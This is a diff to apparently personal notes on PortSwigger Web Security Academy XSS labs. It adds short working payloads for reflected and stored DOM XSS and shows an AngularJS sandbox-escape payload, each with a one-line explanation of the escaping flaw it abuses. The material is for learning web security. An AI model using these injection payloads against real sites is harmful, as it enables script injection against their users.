@@ -32,4 +32,12 @@ payload: ```https://ac8e1fa11fa32607c0a0cfa800b700a8.web-security-academy.net/fe
 
 -> payload: ``` {{constructor.constructor('alert(1)')()}}```
 
-## 
+
+## Lab: Reflected DOM XSS
+
+-> payload: ```123\"};alert(1)//``` (`"` being escaped but `\` not being escaped)
+
+
+## Lab: Stored DOM XSS
+
+-> payload: ```<> <img="1.jpg" onerror="alert(1)">``` (replace function only replace the first argument of string, other argument not reqpace )
